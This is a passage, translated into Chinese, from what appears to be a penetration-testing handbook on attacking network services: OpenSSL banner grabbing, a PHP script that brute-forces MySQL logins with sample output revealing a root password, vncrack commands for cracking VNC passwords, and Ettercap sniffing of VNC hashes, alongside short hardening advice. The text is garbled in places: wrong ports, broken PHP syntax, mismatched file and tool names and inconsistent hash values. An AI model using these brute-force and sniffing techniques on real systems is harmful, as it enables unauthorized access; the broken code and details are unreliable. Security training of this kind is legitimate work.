

命令行工具 `openssl` 可用于连接到 IMAPS 服务器：

```
openssl s_client -connect:192.168.1.1:993
```

OpenSSL 可以在 http://www.openssl.org/ 获取。
更多信息请参见前面的章节“IMAP2/IMAP4 (互联网消息访问协议 2/4): 143 (TCP)”。

# POP3S (安全邮局协议 3): 995 (TCP)

POP3 在 SSL（安全套接层）上运行。POP3 使用 SSL 来建立并维护安全通道，并在客户端和服务器之间提供加密通信。

命令行工具 `openssl` 可用于连接到 POP3S 服务器以获取横幅（banner）信息：

```
openssl s_client -connect:192.168.1.1:993
```

OpenSSL 可以在 http://www.openssl.org/ 获取。
更多信息请参见前面的章节“POP3 (邮局协议 3): 110 (TCP)”。

# NFS: 2049 (TCP 和 UDP)

请参见前面的章节“Portmapper: 111 (TCP)”。

# MySQL: 3306 (TCP)

MySQL 是一个流行的开源数据库软件包。它可以在 http://www.mysql.com/ 获取。

暴力破解：由于 MySQL 使用用户名和密码对进行身份验证，因此可能对其进行暴力破解攻击。

# MySQL 暴力破解

以下 PHP 脚本可用于对 MySQL 服务器进行暴力破解：

```php
<?
/*Author: Nitesh Dhanjani [ hacknotes@dhanjani.com ]
此脚本尝试对 MySQL 服务器进行暴力破解。请确保 $username 和 $password 设置为包含用户名和密码的文件名以便进行尝试。*/

$username="usernames.txt";
$password="passwords.txt";
if($argc != 2) 
{
    print "Usage: argv[0] hostname\n";
    exit();
}
```

```php
$ufilehandle=fopen($username,"r");
$pfilehandle=fopen($password,"r");
```

```php
if(!$ufilehandle) || !($pfilehandle))
{
    print("Could not open username or password file.\n");
    exit();
}
```

```php
while($username=$fscanf($ufilehandle,"%s\n"))
    while($password=$fscanf($pfilehandle,"$s\n"))
        if(mysql_connect($argv[1],$username[0],$password[0]))
            print("SUCCESS: $username[0], $password[0]\n");
```

```php
print("DONE\n");
?>
```

我们将上述文件称为 `mssqlite.php`。以下是脚本的示例用法：

```bash
[bash]$php -f mssqlite.php mssql.somecompanyanexample.com
SUCCESS!: root, sqlMy455!
DONE
```

PHP 编程语言解释器可以在 http://www.php.net/ 下载。

# 防止 MySQL 暴力破解

请参见“针对暴力攻击的常见防御措施”。

MySQL 嗅探使用明文协议在客户端和服务器之间建立连接。因此，网络段上的用户可以嗅探 MySQL 会话。

# 嗅探 MySQL 流量

Ettercap 可捕获身份验证期间通过网络发送的 MySQL 哈希值（图 4-1）。此外，由于 MySQL 使用明文机制传输数据，可以使用 Ettercap 或 Ethereal 等网络分析器监控用户会话。

![](img/17cb132e62949dc7f5e0eadf90c71f51_151_0.png)

图 4-1。可以使用 Ethereal 捕获 MySQL 会话。Ethereal 从 http://www.ethereal.com/ 下载。

# 封加固 MySQL

如果您在主机上运行 MySQL 服务器，请考虑以下建议：

- 配置防火墙以阻止指向 MySQL 服务器的入站连接。在大多数情况下，只需要本地 MySQL 访问。
- 加固您的 MySQL 配置以允许来自远程用户的连接。详细说明请参见 http://www.mysql.com/documentation/manual/MySQL_Administration.html。

# VNC (虚拟网络计算): 5800+, 5900+ (TCP)

VNC 是一种远程控制软件，允许访问远程主机的桌面。VNC 是免费软件，可以在 http://www.realvnc.com/ 下载。实例仅需密码即可身份验证。因此，VNC 账户可以被远程暴力破解。

# VNC 暴力破解

可以使用 http://www.phenoit.de/vncrack/ 提供的 `vncrack` 工具对 VNC 进行暴力破解。

```bash
$vncrack -h 10.0.0.1 -w passwords.txt
```

此外，还可以对用户的 `~/.vnc/passwd` 文件进行暴力破解，该文件包含 VNC 密码哈希：

```bash
$vncrack -C ~/.vnc/passwd
VNC password: test123
```

![](img/17cb132e62949dc7f5e0eadf90c71f51_152_0.png)

# 防止 VNC 暴力破解

嗅探：可以嗅探通过网络传输的 VNC 密码哈希。一旦获得密码哈希，必须进行暴力破解以破解真实密码。

# 嗅探并破解 VNC 密码

使用 Ettercap 获取服务器挑战和客户端哈希：

```bash
# aftercap -C -N
ettercap 0.6.9 (c)
Your IP: 192.168.1.1 with MAC: 00:30:23:C1:00:00 Iface: eth0
Loading plugins... Done.
Building host list for netmask 255.255.255.0, please wait...
Resolving hostnames...
* |=======================================| 100%
Press 'h' for help...
Sniffing (MAC based): ANY ---> ANY
TCP + UDP packets... (default)
Collecting passwords...
10:04:28 192.168.1.1:6612 --> 10.0.0.1:5901 
USER: On display :0
PASS:
Server Challenge: 612b8f9e6dfe71ba27abff79c06
Client 3DES: 4e2568a12e5e7825add6
```

现在使用之前提到的 `vncrack` 工具破解获取的哈希：

```bash
$vncrack -v 612b8f9e6dfe71ba27abff79c06 -r 4e2568a12e5e7825add65196 -w passwords.txt
VNCRACK - by Benoit (http://www.phenoit.de/)
Challenge: 612b8f9e6dfe71ba27abff79c16
Response : 4e2568a12e5e7825add65196
Password: test123
```

VNC 查看器与 VNC 服务器之间的活动流量未加密，可以被网络段上的用户嗅探。然而，目前尚无已知工具可以解析网络传输的活动活动流量。

# 通过 SSH 安全地隧道 VNC 流量

使用 SSH 安全地隧道 VNC 流量。详情请参见 http://www.ukresearch.att.com/vnc/sshvnc.html。

VNC 配置错误：可以为 VNC 身份验证设置空密码。许多用户选择设置空密码，这允许入侵者完全控制他们的桌面。

软件漏洞：VNC 软件已知存在一些漏洞。以下是最近公布的一些漏洞列表。

- TightVNC 身份验证 Cookie 可预测漏洞：`vncserver` 程序本身是一个负责生成 X 服务器身份验证 Cookie 的 Perl 脚本。在 TightVNC 的 `vncserver` 实现中发现的漏洞会导致生成可预测的身份验证 Cookie。这种情况导致攻击者可能预测与远程 VNC 服务器身份验证所需的响应。详见 http://securityfocus.com/bid/6905。
- TightVNC 重复挑战重放攻击漏洞：VNC 身份验证机制使用挑战响应方案来验证用户。这导致 VNC 客户端每次身份验证时发送不同的密码哈希。TightVNC 软件中发现的漏洞允许网络段上的恶意用户重用之前获取的密码哈希。更多信息请访问 http://securityfocus.com/bid/5296。

